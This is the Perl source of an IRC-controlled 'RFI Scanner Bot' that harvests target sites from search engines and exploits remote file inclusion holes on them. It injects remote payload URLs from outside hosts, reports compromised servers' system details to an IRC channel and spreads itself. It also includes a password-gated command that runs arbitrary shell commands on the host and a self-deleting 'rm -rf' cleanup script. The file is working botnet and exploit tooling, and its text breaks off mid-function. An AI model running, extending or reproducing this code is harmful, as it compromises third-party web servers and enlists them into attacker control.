#!/usr/bin/perl

################################################
## FeeLCoMz RFI Scanner Bot v2.4 	      ##
## By CADOTUNJI 	     		      ##
## Copyleft July 2008	     		      ##
## Usage: perl feelbotz.pl <channel> <server> ##
################################################

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

###################
## CONFIGURATION ##
###################

my $id  = "http://scan.fileave.com/test.txt";
my $shell = "http://scan.fileave.com/test.txt??";
my $spread = "http://www.phdcursos.com.br/http/echo.txt?";
#my $id  = "http://scan.fileave.com/test.txt";
#my $shell = "http://scan.fileave.com/test.txt??";
@ircservers = (
"irc.ALLindoServ.net",
#"localhost",
#"irc.ALLindoServ.net",
#"irc.ALLindoServ.net",
#"irc.ALLindoServ.net",
#"irc.ALLindoServ.net"
);

my $chan1 = "#RFI-SCANNER";
my $chan2 = "#RFI-SCANNER";
my $chan3 = "#RFI-SCANNER";
my $c1k = "Osirys";
my $c2k = "Osirys";
my $ircd = $ircservers[rand(scalar(@ircservers))];
my $port = "6667";
my $nick = "scanner[".int(rand(1000))."]";
my $ident = "scanner[".int(rand(1000))."]";
my $admin = "Osirys";

my $rfipidproc = 30;
my $spreadMode = 1;
my $secMode = 0;
my $secpwd = "cadotunji";
my $spreadpwd = "cadotunji";
my $killpwd = "cadotunji";
my $chidpwd = "cadotunji";
my $cmdpwd = "cadotunji";
my @user_agent = &uagent();

$chan1 = "#"."$ARGV[0]" if $ARGV[0];
$ircd = "$ARGV[1]" if $ARGV[1];

##########################
## END OF CONFIGURATION ##
##########################

open ($f1le,">","hapus.txt");
print $f1le "\#!/usr/bin/perl\n";
print $f1le "exec(\"rm -rf \*situs\*\")\;\n";
close $f1le;

@pubhelp = (
"8,1 [X] 13!scan <bug> <dork> 0 Start the RFI Scanner ",
"8,1 [X] 13!response 0 Check the RFI Response ",
);

@help = (
"8,1 [X] 13!rfi <bug> <dork> -p <sites/proc> 0 Start the RFI Scanner ",
"8,1 [X] 13!response 0 Check the RFI Response ",
"8,1 [X] 13!chid <new rfi-id> 0 Change the RFI-Response ",
"8,1 [X] 13!cmd <bashline> 0 Execute command ",
"8,1 [X] 13/msg $nick !sec ON/OFF -p <pwd> 0 Enable or disable Security Mode ",
"8,1 [X] 13/msg $nick !spread ON/OFF -p <pwd> 0 Enable or disable Spread Mode ",
"8,1 [X] 13!info 0 Get infos about the Bot ",
"8,1 [X] 13/msg $nick !keluar -p <pwd> 0 Kill the bot "
);

@sechelp = (
$help[0],
$help[1],
"8,1 [X] 13/msg $nick !chid <new rfi-id> -p <pwd> 0 Change the RFI-Response ",
"8,1 [X] 13/msg $nick !cmd <bashline> -p <pwd> 0 Execute command ",
$help[4],
$help[5],
$help[6],
$help[7],
);

$k = 0;

my $sys = `uname -a`;
my $up = `uptime`;

if ( fork() == 0 ) { &irc( $ircd, $port, $chan1, $chan2, $nick ); }
else { exit; }

sub irc () {
	my ($ircd, $port, $chan1, $chan2, $nick ) = @_;
	$sock = IO::Socket::INET->new(PeerAddr => "$ircd",PeerPort => "$port",Proto => "tcp") or die "Could not connect to $ircd!\n";
	$sock->autoflush(1);
	print $sock "NICK $nick\r\n";
	print $sock "USER $ident localhost $ircd :coded by FaTaLisTiCz_Fx recoded by BLood_roSE\r\n";
	
	while ($line = <$sock>) {
		$k++;		
		#print "$line"; #Debugging Purposes
		if ($spreadMode == 0) { $t5 = "OFF"; } else { $t5 = "ON"; }
		if ($secMode == 0) { $y5 = "OFF"; }     else { $y5 = "ON"; }		
		@info = (
		"8,1 [X] 13Version 9:0,1 BaNdiToZ muLti RFI Scanner Bot v8.8",
		"8,1 [X] 13Author 9:0,1 FaTaLisTiCz_Fx recoded by BLood_roSE",
		"8,1 [X] 13Uname -a9:0,1 $sys ",
		"8,1 [X] 13Uptime 9:0,1 $up ",
		"8,1 [X] 13Spread Mode9:0,1 $t5 ",
		"8,1 [X] 13Security Mode9:0,1 $y5 "
		);		
		@info2 = (
		$info[0],
		$info[1],
		$info[3]
		);		
		if ($line =~ /^PING \:(.*)/) { print $sock "PONG :$1\n"; }
		if ($line =~ /004/) {
			join1("$chan1 $c1k");
			join1("$chan2 $c2k");
			join1("$chan3");
			msg1("6R1eady to 6Scan..!");
		}
		if ($line =~ /PRIVMSG $chan2 :!help/) {
			if ($secMode == 0) { @dhelp = @help; }
			else { @dhelp = @sechelp; }
			foreach my $e(@dhelp) { msg2("$e"); }
		}
		if ($line =~ /PRIVMSG $chan1 :!help/) {
			@pubhelp;
			foreach my $e(@pubhelp) { msg1("$e"); } 
		}
		if ( $line =~ /PRIVMSG $chan2 :!info/) {
			@info;
			foreach my $n(@info) { msg2("$n"); }
		}
		if ( $line =~ /PRIVMSG $chan1 :!info/) {
			@info2;
			foreach my $n(@info) { msg2("$n"); }
		}		
		if ( $line =~ /PRIVMSG $chan1 :!response/ ) {
			my $re = query($id);
			my $re2 = query($shell);
			if ( $re =~ /Osirys/ ) { $rid = "0OK"; } 
			else { $rid = "6ERROR"; }
			if ( $re2 =~ /Osirys/ ) { $rsh = "0OK"; }
			else { $rsh = "6ERROR"; }
			msg1("8,1 [X] 13RFI Response is $rid ");
			msg1("8,1 [X] 13RFI Shell is $rsh ");
		}
		if (($line=~ /PRIVMSG $chan2 :!chid\s+(.*) -p $chidpwd/) && ($secMode == 1)) {
			$newid = $1;
			$id = $newid;
			msg2("12+ 5RFI Response 12changed ");
			msg2("12+ 5New RFI Response:12 $id");
		}
		elsif (($line=~ /PRIVMSG $chan2 :!chid\s+(.*)/) && ($secMode == 0)) {
			$newid = $1;
			$id = $newid;
			msg2("12+ 5RFI Response changed!");
			msg2("12+ 5New RFI Response:12 $id");
		}
		if ($line=~ /PRIVMSG $nick :!keluar -p $killpwd/) {
			msg1("5[!] 12Game Over!");
			print $sock "QUIT";
			exec("perl hapus.txt && pkill perl \n");
		}
		if (($line=~ /PRIVMSG $nick :!cmd\s+(.*) -p $cmdpwd/) && ($secMode == 1) && (fork() == 0)) {
			my $cmd = $1;
			if ($cmd =~ /cd (.*)/) {
				chdir("$1") || priv1("Can't change dir");
				return;
			}
			my @output = `$1`;
			my $count = 0;
			foreach my $out(@output) {
				$count++;
				if ($count == 5) {
					sleep(3);
					$count = 0;
				}
				priv1("12+12 $out");
			}
			exit;
		}
		elsif  (($line=~ /PRIVMSG $chan2 :!cmd\s+(.*)/) && ($secMode == 0) && (fork() == 0)) {
			my $cmd = $1;
			if ($cmd =~ /cd (.*)/) {
				$dir = $1;
				chomp($dir);
				chdir ($dir) || msg2("Can't change dir");
			}
			my @output = `$1`;
			my $count = 0;
			foreach my $out(@output) {
				$count++;
				if ($count == 5) {
					sleep(3);
					$count = 0;
				}
				msg2("12+12 $out");
			}
			exit;
		}
		if ($line=~ /PRIVMSG $nick :!sec\s+(.*) -p $secpwd/) {
			$s = $1;
			if ($s =~ /ON/) { $secMode = 1;$secstat = "ACTIVATED"; }
			elsif ($s =~ /OFF/) { $secMode = 0;$secstat = "DISABLED"; }
			msg2("12+ 12Security Mode is $secstat !!");
		}
		if ($line=~ /PRIVMSG $nick :!spread\s+(.*) -p $spreadpwd/) {
			$s = $1;
			if ($s =~ /ON/) { $spreadMode = 1;$spreadstat = "ACTIVATED"; }
			elsif ($s =~ /OFF/) { $spreadMode = 0;$spreadstat = "DISABLED"; }
			msg2("12+ 12Spread Mode is $spreadstat !!");			
		}
		if ($line=~ /PRIVMSG $chan2 :!tescari\s+(.*)/) {
			my @hclist = tescari($1);
			my @hccl = unici(@hclist);
			msg2("Hasil: ".scalar(@hclist)." Dibersihkan: ".scalar(@hccl));
			foreach my $e(@hccl) {
				msg2($e);	
			}			
		}
		if (($line =~ /PRIVMSG $chan1 :!rfi\s+(.*?)\s+(.*)\s+-p(.+[0-9])/) && (fork() == 0)) {
			if ($3 > 100) { msg1("Could not more than 100 site/proc");exit(0); }
			my ($bug, $dork, $rfipid) = ($1, $2, $3);
			msg1("0,1 ![!]!13 RFI Scanner started. $rfipid sites/process 0![!]! ");
			$d0rk = clean($dork);
			msg1("13,1 ![Bug]!0 $bug ");
			msg1("13,1 ![Dork]!0 $d0rk ");
			my $n4me = $k . "situs.txt";
			find($d0rk, $n4me);
			rfi($bug, $n4me, $d0rk, $rfipid);
			msg1("0,1 ![!]!13 RFI Scanner finished for0 $d0rk 0![!]! ");
			exit(0);
		}
		if (($line =~ /PRIVMSG $chan1 :!scan\s+(.*?)\s+(.*)/) && (fork() == 0)) {
			my ($bug, $dork, $rfipid) = ($1, $2, $rfipidproc);
			msg1("0,1 ![!]!13 RFI Scanner started. $rfipid sites/process 0![!]! ");
			$d0rk = clean($dork);
			msg1("13,1 ![Bug]!0 $bug ");
			msg1("13,1 ![Dork]!0 $d0rk ");
			my $n4me = $k . "situs.txt";
			find($d0rk, $n4me);
			rfi($bug, $n4me, $d0rk, $rfipid);
			msg1("0,1 ![!]!13 RFI Scanner finished for0 $d0rk 0![!]! ");
			exit(0);
		}
	}
}

## FUNCTIONS ##

sub find () {
    my $dork = $_[0];
    my $name = $_[1];
    my @engine;
    msg1("0,1 ![!]!13 Searching on 22 engines. Please wait.. 0![!]! ");
    $engine[0] = fork();
    if ( $engine[0] == 0 ) {
	my @glist = google( $dork, $name );
	my @gcl = unici(@glist);
	msgr("Google.co.id",scalar(@glist),scalar(@gcl));
	exit;
    }
    $engine[1] = fork();    
    if ( $engine[1] == 0 ) {
	my @g2list = google2( $dork, $name );
	my @g2cl = unici(@g2list);
	msgr("Google",scalar(@g2list),scalar(@g2cl));
	exit;
    }
    $engine[2] = fork();
    if ( $engine[2] == 0 ) {
	my @altlist = altavista( $dork, $name );
	my @altcl = unici(@altlist);
	msgr("Altavista",scalar(@altlist),scalar(@altcl));
	exit;
    }
    $engine[3] = fork();
    if ( $engine[3] == 0 ) {
	my @ylist = yahoo( $dork, $name );
	my @ycl = unici(@ylist);
	msgr("Yahoo",scalar(@ylist),scalar(@ycl));
	exit;
    }
    $engine[4] = fork();
    if ( $engine[4] == 0 ) {
	my @asklist = ask( $dork, $name );    	
	my @askcl = unici(@asklist);
	msgr("Ask",scalar(@asklist),scalar(@askcl));
	exit;
    }
    $engine[5] = fork();
    if ($engine[5] == 0) {
	my @fblist = fireball($dork,$name);
	my @fbcl = unici(@fblist);
	msgr("Fireball",scalar(@fblist),scalar(@fbcl));
	exit;
    }
    $engine[6] = fork();
    if ($engine[6] == 0) {
	my @gigalist = gigablast($dork,$name);
	my @gigacl = unici(@gigalist);
	msgr("Gigablast",scalar(@gigalist),scalar(@gigacl));
	exit;
    }
    $engine[7] = fork();
    if ($engine[7] == 0) {
	my @lyclist = lycos($dork,$name);
	my @lycl = unici(@lyclist);
	msgr("Lycos",scalar(@lyclist),scalar(@lycl));
	exit;
    }
    $engine[8] = fork();
    if ($engine[8] == 0) {
	my @livelist = live($dork,$name);
	my @livecl = unici(@livelist);
	msgr("Live",scalar(@livelist),scalar(@livecl));
	exit;
    }
    $engine[9] = fork();
    if ($engine[9] == 0) {
	my @virgilist = virgilio($dork,$name);
	my @virgicl = unici(@virgilist);
	msgr("Virgilio",scalar(@virgilist),scalar(@virgicl));
	exit;
    }
    $engine[10] = fork();
    if ($engine[10] == 0) {
	my @uollist = uol($dork,$name);
	my @uolcl = unici(@uollist);
	msgr("Uol",scalar(@uollist),scalar(@uolcl));
	exit;
    }
    $engine[11] = fork();
    if ($engine[11] == 0) {
	my @mammalist = mamma($dork,$name);
	my @mammacl = unici(@mammalist);
	msgr("Mamma",scalar(@mammalist),scalar(@mammacl));
	exit;
    }
    $engine[12] = fork();
    if ($engine[12] == 0) {
	my @hotlist = hotbot($dork,$name);
	my @hotcl = unici(@hotlist);
	msgr("Hotbot",scalar(@hotlist),scalar(@hotcl));
	exit;
    }
    $engine[13] = fork();
    if ($engine[13] == 0) {
	my @clustylist = clusty($dork,$name);
	my @clustycl = unici(@clustylist);
	msgr("Clusty",scalar(@clustylist),scalar(@clustycl));
	exit;
    }
    $engine[14] = fork();
    if ( $engine[14] == 0 ) {
	my @alist = alltheweb( $dork, $name );
	my @acl = unici(@alist);
	msgr("AllTheWeb",scalar(@alist),scalar(@acl));
	exit;
   }    
    $engine[15] = fork();    
    if ( $engine[15] == 0 ) {
	my @eurolist = euroseek( $dork, $name );
	my @eurocl = unici(@eurolist);
	msgr("Euroseek",scalar(@eurolist),scalar(@eurocl));
	exit;
    }    
    $engine[16] = fork();    
    if ( $engine[16] == 0 ) {
	my @webdelist = webde( $dork, $name );
	my @webcl = unici(@webdelist);
	msgr("Web.de",scalar(@webdelist),scalar(@webcl));
	exit;
    }    
    $engine[17] = fork();    
    if ( $engine[17] == 0 ) {
	my @dmozlist = dmoz( $dork, $name );
	my @dmozcl = unici(@dmozlist);
	msgr("Dmoz",scalar(@dmozlist),scalar(@dmozcl));	
	exit;
    }
    $engine[18] = fork();    
    if ( $engine[18] == 0 ) {
	my @webcrawlist = webcrawler( $dork, $name );
	my @webcrawcl = unici(@webcrawlist);
	msgr("Webcrawler",scalar(@webcrawlist),scalar(@webcrawcl));
	exit;
    }        
    $engine[19] = fork();    
    if ( $engine[19] == 0 ) {
	my @fzlist = fazzle( $dork, $name );
	my @fzcl = unici(@fzlist);
	msgr("Fazzle",scalar(@fzlist),scalar(@fzcl));
	exit;
    }        
    $engine[20] = fork();    
    if ( $engine[20] == 0 ) {
	my @ablist = about($dork,$name);
	my @abcl = unici(@ablist);
	msgr("About",scalar(@ablist),scalar(@abcl));
	exit;
    }        
    $engine[21] = fork();    
    if ( $engine[21] == 0 ) {
	my @netlist = netscape($dork,$name);
	my @netcl = unici(@netlist);
	msgr("Netscape",scalar(@netlist),scalar(@netcl));
	exit;
    }        
    $engine[22] = fork();    
    if ( $engine[22] == 0 ) {
	my @infolist = infospace($dork,$name);
	my @infocl = unici(@infolist);
	msgr("Infospace",scalar(@infolist),scalar(@infocl));
	exit;
    }        
    foreach my $e(@engine){ waitpid($e,0); }
    msg1("0,1 ![!]!13 Search finished for0 $d0rk 0![!]! ");
}

sub rfi () {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2];
    my $rfipid = $_[3];
    my @forks;
    my $num = 0;    
    open( filez, '<', $name );
    while ( my $a = <filez> ) {
	$a =~ s/\n//g;
	push( @tot, $a );
    }
    close filez;
    remove($name);
    my @toexploit = unici(@tot);
    msg1("0,1 ![!]!13 Total :0 ".scalar(@tot)." 8sites. Cleaned:0 ".scalar(@toexploit)." 8sites. 0![!]! ");    
    sleep(1);
    msg1("0,1 ![!]!13 Begin exploiting. Please wait.. 0![!]! ");
    foreach my $site (@toexploit) {
	my $test  = "http://" . $site . $bug . $id . "?";
	#print "$test\n";
	$count++;
	if ( $count % $rfipid == 0 ) {
	    foreach my $f(@forks){ waitpid($f,0); }
	    $num = 0;
	}
	if($count %100 == 0){		 
	    msg1("8,1 [X]15 ".$count." 0�8 ". scalar(@toexploit). " 13[x] ");
	    #msg3("12�12 ". $count. "12 ".$site."");	    
	}
	$forks[$num]=fork();
	if($forks[$num] == 0){
	    my $test  = "http://".$site.$bug.$id."?";
	    my $print = "http://".$site.$bug."8".$shell."?";
	    my $re    = query($test);
	    if ( $re =~ /FeeLCoMzOFF/ ) {
		os($test);
		msg2("8,1 .:[7SAFE OFF13]:.8 [$os]0 [ $print 0]");
		msg2("13,1 [Uname]:15[ $un ]");
		msg2("13,1 [User]:15[ $id1 ]");
		sleep(3);
		msg1("8,1 .:[7SAFE OFF13]:.8 [$os]0 [ $print 0]");
		msg1("13,1 [Uname]:15[ $un ]");
		msg1("13,1 [User]:15[ $id1 ]");
		msg1("13,1 [HDD]:15[ Free:13 $free 15Used:13 $used 15Total:13 $all 15] ");
		#2nd Chan
		if ( $spreadMode == 1 ) {
		    msg2("0,1 ![!]!13 Spreadding.. ");
		    my $test2 = "http://" . $site . $bug . $spread . "?";
		    my $reqz  = query2($test2);
		}
		sleep(2);
	    }
	    elsif ( $re =~ /Osirys/ ) {
		os($test);
		#2nd Chan
		msg2("8,1 .:[13SAFE ON13]:.8 [$os]0 [ $print 0]");		
		sleep(3);
		msg1("8,1 .:[13SAFE ON13]:.8 [$os]0 [ $print 0]");
		msg1("13,1 [Uname]:15[ $un ]");
		msg1("13,1 [User]:15[ $id1 ]");
		msg1("13,1 [HDD]:15[ Free:13 $free 15Used:13 $used 15Total:13 $all 15] ");		
		if ( $spreadMode == 1 ) {
		    msg2("0,1 ![!]!13 Spreadding.. ");
		    my $test2 = "http://" . $site . $bug . $spread . "?";
		    my $reqz  = query2($test2);
		}
		sleep(2);		
	    }
	    exit(0);
	}
	$num++;
    }
    foreach my $f(@forks){ waitpid($f,0); }
}

####################
## SEARCH ENGINES ##
####################

sub tescari () {
    my @list;
    my $tesquery = $_[0];
    my $key = $_[1];
    for ($p = 0;$p <= 1; $p++) {	
	my $re = query($tesquery);
	open($cp,">","tespage.txt");
	print $cp "$re\n";
	close($cp);
	if ($re =~ /<title>404 Not Found<\/title>/) {
		msg2("404 for $tesquery");
		return @list;
	}
	#while ($re =~ m/<h2 class=r><a href=\"?http:\/\/([^>\"]*)\//g) { #google
	#while($re =~ m/<a id=\"(.+?)\" href=\"http:\/\/(.*?)\" onmousedown=/g){ #ask
	#while($re =~ m/<a id=\"(.+?)\" href=\"http:\/\/(.+?)\"/g){ #ask		
	while ( $re =~ m/26u=(.+?)\%26w=/g ) { #yahoo	
	    my $k = $1; #google,yahoo
	    #my $k = $2; #ask
	    if ($k !~ /google|ask.com/) {
		my @grep = links($k);
		open( $nf, ">>", "teshasil.txt");
		foreach my $k (@grep) {
		    print $nf "$k\n";
		}
		close $nf;
		push(@list, @grep);
	    }
	}
    }
    return @list;
}

sub GoogleDomain(){
	my @ret = (
		"ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","fi","fr","gr","com.hk",
		"ie","co.il","it","co.jp","co.kr","lt","lv","nl","com.pa","com.pe","pl","pt","ru","com.sg",
		"com.tr","com.tw","com.ua","co.uk","hu" );
	return @ret;
}
## GOOGLE ##
sub google () {
    my @gsites;
    my $key = $_[0];
    my $name = $_[1];
    my $gtest = ("http://www.google.co.id/search?q=feelcomz");    
    my $ret = query($gtest);
    if ($ret =~ /kita akan bertemu kembali di Google/) {
	msg1("0,1 ![!]!12 Banned by Google.co.id 0![!]! ");
    }
    else {
    	@gsites = gfind($key,$name);
    }
    return @gsites;
}

sub google2 () {
    my @g2sites;
    my $key = $_[0];
    my $name = $_[1];
    my $gtest = ("http://www.google.com/search?q=feelcomz");
    my $ret = query($gtest);
    if ($ret =~ /see you again on Google/) {
	msg1("0,1 ![!]!12 Banned by Google.com 0![!]! ");
    }
    else {
	@g2sites = gfind2($key,$name);
    }
    return @g2sites;
}

sub gfind () {
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 5000; $p += 50) {
	my $g0gle = ("http://www.google.co.id/search?hl=id&q=".key($key)."&num=50&sa=N&start=".$p);
	#http://www.google.co.id/search?hl=id&pwst=1&q=search+engine+list&start=30&sa=N
	my $gr = query($g0gle);
	while ($gr =~ m/<h2 class=r><a href=\"?http:\/\/([^>\"]*)\//g) {
	    my $k = $1;
	    if ($k !~ /google/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "google1.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
	if ($gr !~ /Berikutnya/) {
		msg3("5(!)12 No more on Google.Co.Id!");
		return @list;
	}
    }
    return @list;
}

sub gfind2 () {
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    my @dom = &GoogleDomain();
    for ($p = 0;$p < 5000; $p += 50) {
	my $domain = $dom[rand(scalar(@dom))];
	my $g0gle = ("http://www.google.".$domain."/search?q=".key($key)."&num=50&sa=N&start=".$p);
	my $gr = query($g0gle);
	while ($gr =~ m/<h2 class=r><a href=\"?http:\/\/([^>\"]*)\//g) {
	    my $k = $1;
	    if ($k !~ /google/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "google2.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
    }
    return @list;
}
## YAHOO ##
sub yahoo () {
    my @ysites;
    my $key = $_[0];
    my $name = $_[1];
    my $ytest = ("http://search.yahoo.com/search?p=hello&ei=UTF-8&fr=yfp-t-501&pstart=1&b=1");
    my $ret = query($ytest);
    if ($ret =~ /We did not find results for/) {
	return @ysites;
    }
    elsif ($ret =~ /title=\"Yahoo! Search results for hello\"/) {
	@ysites = yfind($key,$name);
	return @ysites;
    }
    else {
	msg1("0,1 ![!]!12 Banned by Yahoo! Bypassing.. 0![!]! ");
	@ysites = yfind2($key,$name);
	return @ysites;
    }
}

sub yfind() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
	for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
	    my $ylink = ("http://search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
	    my $re = query($ylink);
	    while ( $re =~ m/26u=(.+?)\%26w=/g ) {
		my $k = $1;
		if ($k !~ /yahoo|wikipedia.org/) {
		    my @grep = links($k);
		    open( $filez, ">>", $name );
		    #open( $nf, ">>", "yahoo.txt");
		    foreach my $k (@grep) {
			print $filez "$k\n";
			#print $nf "$k\n";
		    }
		    close $filez;
		    #close $nf;
		    push( @lst, @grep );
		}
	    }
	}
    return @lst;
}

sub yfind2() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
	for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
	    my $ylink = ("http://id.search.yahoo.com/search?p=".key($key)."&pstart=1&b=".$b);	    
	    my $re = query($ylink);
	    while ( $re =~ m/26u=(.+?)\%26w=/g ) {
		my $k = $1;
		if ($k !~ /yahoo|wikipedia.org/) {
		    my @grep = links($k);
		    open( $filez, ">>", $name );
		    #open( $nf, ">>", "yahoo.txt");
		    foreach my $k (@grep) {
			print $filez "$k\n";
			#print $nf "$k\n";
		    }
		    close $filez;
		    #close $nf;
		    push( @lst, @grep );
		}
	    }
	}
    return @lst;
}

## EUROSEEK ##
sub euroseek () {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $p = 0 ; $p <= 8000 ; $p += 10 ) {
	my $gp = ("http://euroseek.com/system/search.cgi?language=en&mode=internet&start=".$p."&string=".key($key));	
	my $re = query($gp);
	while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/g ) {
	    my $k = $1;
	    my @grep = links($k);
	    open( $filez, ">>", $name );
	    #open( $nf, ">>", "euroseek.txt");
	    foreach my $k (@grep) {
		print $filez "$k\n";
		#print $nf "$k\n";
	    }
	    close $filez;
	    #close $nf;
	    push( @lst, @grep );
	}
	if ($k !~ /\">Next<\/a>/) {
		msg3("5(!)12 No more on Euroseek!");
		return @lst;
	}	
    }
    return @lst;
}
## ALLTHEWEB ##
sub alltheweb() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $i = 0 ; $i <= 5000 ; $i += 100 ) {
	my $All = ( "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
	my $re = query($All);
	while ( $re =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g ) {
	    my $k = $1;
	    $k =~ s/ //g;
	    my @grep = links($k);
	    open( $filez, ">>", $name );
	    #open( $nf, ">>", "alltheweb.txt");
	    foreach my $k (@grep) {
		print $filez "$k\n";
		#print $nf "$k\n";
	    }
	    close $filez;
	    #close $nf;
	    push( @lst, @grep );
	}
	if ( $re !~ /class=\"rnavLink\">Next/ ) {
		msg3("5(!)12 No more on Alltheweb!");
		return @lst;
	}
    }
    return @lst;
}
## ALTAVISTA ##
sub altavista() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ($b = 1;$b <= 5000;$b += 100) {
	my $Alt = ("http://www.altavista.com/web/results?itag=ody&q=".key($key)."&kgs=0&kls=0&nbq=100&stq=".$b);
	my $re = query($Alt);
	while ( $re =~ m/<span class=ngrn>(.+?) <\/span>/g ) {
	    if ( $1 !~ /yahoo/ && $1 !~ /Altavista/ ) {
		my $k = $1;
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "altavista.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push( @lst, @grep );
	    }
	}
	if ( $re !~ /target=\"_self\">Next/ ) {
		msg3("5(!)12 No more on Altavista!");
		return @lst;
	}
    }
    return @lst;
}

## ASK ##
sub ask () {
    my $key = $_[0];
    my $name = $_[1];
    my @lst;
    my $askt = ("http://www.ask.com/web?q=".key($key));
    my $asktest = query($askt);
    if ($asktest =~ /match with any Web results/) {
    	msg3("No result on ask!");
	return @lst;
    }
    else {
	for ($p=0;$p<=100;$p++){
		my $asklink = ("http://www.ask.com/web?q=".key($key)."&o=0&l=dir&page=".$p);
		my $re = query($asklink);
		while($re =~ m/<a id=\"(.+?)\" href=\"http:\/\/(.+?)\"/g){
			my $k = $2;
			if ($k !~ /ask.com|wikipedia/){
				my @grep = links($k);
				open( $filez, ">>", $name );
				#open( $nf, ">>", "ask.txt");
				foreach my $k (@grep) {
					print $filez "$k\n";
					#print $nf "$k\n";
				}
				close $filez;
				#close $nf;
				close $filez;
				push( @lst, @grep );
			}
		}
		if ($re !~ /style=\"text-decoration:none\" >Next/) {
			msg3("5(!)12 No more on Ask!");
			return @list;
		}
	}
	return @lst;
    }
}
## GIGABLAST ##
sub gigablast() {
    my $key = $_[0];
    my $name = $_[1];
    my @lst;
    my $max = 10000;
    my $gigablastlink = ("http://www.gigablast.com/search?q=".key($key)."&n=".$max);
    my $re = query($gigablastlink);
    while($re =~ m/<a class=\"result-title\" href=\"http:\/\/(.+?)\">/g) {
	my $k = $1;
	if ($k !~ /fireball/) {	
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "gigablast.txt");
		foreach my $k (@grep) {
			print $filez "$k\n";
			#print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push( @lst, @grep );
	}
    }
    return @lst;
}
## FIREBALL ##
sub fireball(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 200; $p++) {
	my $re = query("http://suche.fireball.de/cgi-bin/pursuit?pag=".$p."&query=".key($key)."&cat=fb_web&enc=utf-8");
	while ($re =~ m/<a href=\"http:\/\/(.+?)\" target/g) {
	    my $k = $1;
	    if ($k !~ /fireball|lycos/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "fireball.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
	if ($re !~ /class=\"nav\">Vorw/) {
		msg3("5(!)12 No more on Fireball!");
		return @list;
	}
    }
    return @list;
}
## WEB.DE ##
sub webde () {
    my $key = $_[0];
    my $name = $_[1];
    my @lst;
    for $p(1..100){
	my $webdelink = ("http://suche.web.de/search/web/?pageIndex=".$p."&su=".key($key)."&y=0&x=0&mc=suche\@web\@navigation\@zahlen.suche\@web");
	my $re = query($webdelink);
	while($re =~ m/href=\"http:\/\/(.+?)\">/g) {
	    my $k = $1;
	    if ($k !~ /\/search\/web|web.de|access_log|accesswatch|awstats\" class=\"neww\"/){
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "webde.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push( @lst, @grep );
	    }
	}
    }
    return @lst;
}
## LIVE ##
sub live () {
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 1000; $p += 10) {
	my $live = ("http://search.live.com/results.aspx?q=".key($key)."&first=".$p."&FORM=PORE");
	my $re = query($live);
	while ($re =~ m/<h3><a href=\"http:\/\/(.+?)\" onmousedown=/g) {
	    my $k = $1;
	    if ($k !~ /msn|microsoft|live|accesswatch|awstats/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "live.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
    }
    return @list;
}
## VIRGILIO ##
sub virgilio(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 1000; $p += 10) {
	my $re = query("http://ricerca.alice.it/ricerca?qs=".key($key)."&filter=1&site=&lr=&hits=10&offset=".$p);
	while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=/g) {
	    my $k = $1;
	    if ($k !~ /virgilio|accesslog|accesswatch|awstats/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "virgilio.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
		#close $nf;
		push(@list, @grep);
	    }
	}
    }
    return @list;
}
## UOL ##
sub uol(){
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 1000; $p += 10) {
	my $re = query("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$p);
	while ($re =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
	    my $k = $1;
	    if ($k !~ /busca|uol|yahoo|accesswatch|awstats/) {
		my @grep = links($k);
		open( $filez, ">>", $name );
		#open( $nf, ">>", "uol.txt");
		foreach my $k (@grep) {
		    print $filez "$k\n";
		    #print $nf "$k\n";
		}
		close $filez;
